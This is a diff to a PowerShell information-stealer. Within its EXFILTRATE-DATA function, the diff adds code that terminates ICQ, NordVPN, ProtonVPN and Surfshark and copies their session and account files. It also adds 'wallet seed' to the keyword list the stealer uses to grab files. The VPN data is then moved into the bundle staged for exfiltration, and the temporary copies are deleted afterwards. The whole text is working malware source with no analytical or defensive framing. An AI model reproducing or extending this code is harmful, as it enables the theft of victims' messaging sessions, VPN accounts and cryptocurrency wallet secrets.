@@ -85,7 +85,7 @@ function EXFILTRATE-DATA {
     
     # All Messaging Sessions
     New-Item -Path "$env:localappdata\Temp" -Name "Messaging Sessions" -ItemType Directory -force | out-null
-    $messaging_sessions = "$env:localappdata\Temp\Messaging Sessions"
+    $messaging_sessions = "$env:localappdata\Temp\Messaging Sessions"                                       
 
     # Telegram Session Stealer
     function telegramstealer {
@@ -113,7 +113,19 @@ function EXFILTRATE-DATA {
         Copy-Item -Path "$elementfolder\sso-sessions.json" -Destination $element_session -Recurse -force
     }
     elementstealer 
+	
+	# ICQ Session Stealer
+    function icqstealer {
+            $processname = "icq"
+            try {if (Get-Process $processname ) {Get-Process -Name $processname | Stop-Process }} catch {}
+            $icq_session = "$messaging_sessions\ICQ"
+            New-Item -ItemType Directory -Force -Path $icq_session
+            $icqfolder = "$env:userprofile\AppData\Roaming\ICQ"
+            Copy-Item -Path "$icqfolder\0001" -Destination $icq_session -Recurse -force
     
+    }
+    icqstealer
+        
     # Signal Session Stealer
     function signalstealer {
         $processname = "signal"
@@ -239,6 +251,66 @@ function EXFILTRATE-DATA {
             Copy-Item -Path "$eafolder" -Destination $ea_session -Recurse -force
     }
     electronic_arts    
+	
+	# All VPN Clients
+	New-Item -Path "$env:localappdata\Temp" -Name "VPN Clients" -ItemType Directory -force | out-null
+    $vpn_clients = "$env:localappdata\Temp\VPN Clients"                                       
+    
+	# NordVPN 
+    function nordvpnstealer {
+            $processname = "nordvpn"
+            try {if (Get-Process $processname ) {Get-Process -Name $processname | Stop-Process }} catch {}
+            $nordvpn_account = "$vpn_clients\NordVPN"
+            New-Item -ItemType Directory -Force -Path $nordvpn_account
+            $nordvpnfolder = "$env:localappdata\nordvpn"
+    		$pattern = "^([A-Za-z]+\.exe_Path_[A-Za-z0-9]+)$"
+            $directories = Get-ChildItem -Path $nordvpnfolder -Directory | Where-Object { $_.Name -match $pattern }
+            $files = Get-ChildItem -Path $nordvpnfolder -File | Where-Object { $_.Name -match $pattern }
+            foreach ($directory in $directories) {
+            $destinationPath = Join-Path -Path $nordvpn_account -ChildPath $directory.Name
+            Copy-Item -Path $directory.FullName -Destination $destinationPath -Recurse -Force
+            }
+            foreach ($file in $files) {
+            $destinationPath = Join-Path -Path $nordvpn_account -ChildPath $file.Name
+            Copy-Item -Path $file.FullName -Destination $destinationPath -Force
+            }
+    		Copy-Item -Path "$nordvpnfolder\ProfileOptimization" -Destination $nordvpn_account -Recurse -force   
+            Copy-Item -Path "$nordvpnfolder\libmoose.db" -Destination $nordvpn_account -Recurse -force
+    }
+    nordvpnstealer
+	
+	# ProtonVPN
+	function protonvpnstealer {
+        $processname = "protonvpn"
+        try {if (Get-Process $processname ) {Get-Process -Name $processname | Stop-Process }} catch {}
+        $protonvpn_account = "$vpn_clients\ProtonVPN"
+        New-Item -ItemType Directory -Force -Path $protonvpn_account
+        $protonvpnfolder = "$env:localappdata\protonvpn"  
+		$pattern = "^(ProtonVPN_Url_[A-Za-z0-9]+)$"
+        $directories = Get-ChildItem -Path $protonvpnfolder -Directory | Where-Object { $_.Name -match $pattern }
+        $files = Get-ChildItem -Path $protonvpnfolder -File | Where-Object { $_.Name -match $pattern }
+        foreach ($directory in $directories) {
+        $destinationPath = Join-Path -Path $protonvpn_account -ChildPath $directory.Name
+        Copy-Item -Path $directory.FullName -Destination $destinationPath -Recurse -Force
+        }
+        foreach ($file in $files) {
+        $destinationPath = Join-Path -Path $protonvpn_account -ChildPath $file.Name
+        Copy-Item -Path $file.FullName -Destination $destinationPath -Force
+        }
+        Copy-Item -Path "$protonvpnfolder\Startup.profile" -Destination $protonvpn_account -Recurse -force
+        }
+    protonvpnstealer
+	
+	#Surfshark VPN
+	function surfsharkvpnstealer {
+        $processname = "Surfshark"
+        try {if (Get-Process $processname ) {Get-Process -Name $processname | Stop-Process }} catch {}
+        $surfsharkvpn_account = "$vpn_clients\Surfshark"
+        New-Item -ItemType Directory -Force -Path $surfsharkvpn_account
+        $surfsharkvpnfolder = "$env:appdata\Surfshark"  
+		Get-ChildItem $surfsharkvpnfolder -Include @("data.dat", "settings.dat", "settings-log.dat", "private_settings.dat") -Recurse | Copy-Item -Destination $surfsharkvpn_account
+    }
+    surfsharkvpnstealer
     
     # Desktop screenshot
     Add-Type -AssemblyName System.Windows.Forms,System.Drawing
@@ -391,11 +463,9 @@ function EXFILTRATE-DATA {
             "facebook",
             "fb",
             "keepass",
-            "keepassx",
             "keepassxc",
             "keys",
             "lastpass",
-            "login",
             "login",
             "mail",
             "memo",
@@ -409,6 +479,7 @@ function EXFILTRATE-DATA {
             "remote",
             "secret",
             "seedphrase",
+	        "wallet seed",
             "server",
             "syncthing",
             "token",
@@ -546,6 +617,7 @@ function EXFILTRATE-DATA {
     Move-Item -Path "$filegrabber" -Destination "$extracted\KDOT" 
     Move-Item -Path "$crypto" -Destination "$extracted\KDOT" 
     Move-Item -Path "$emailclientsfolder" -Destination "$extracted\KDOT" 
+	Move-Item -Path "$vpn_clients" -Destination "$extracted\KDOT" 
     
     # Don't send null data
     Get-ChildItem -Path "$extracted\KDOT" -File | ForEach-Object {
@@ -575,6 +647,7 @@ function EXFILTRATE-DATA {
     Remove-Item "$messaging_sessions" -recurse -force
     Remove-Item "$gaming_sessions" -recurse -force
     Remove-Item "$emailclientsfolder" -recurse -force
+	Remove-Item "$vpn_clients" -recurse -force
     Remove-Item "$extracted\main.exe" -Force
 }
 
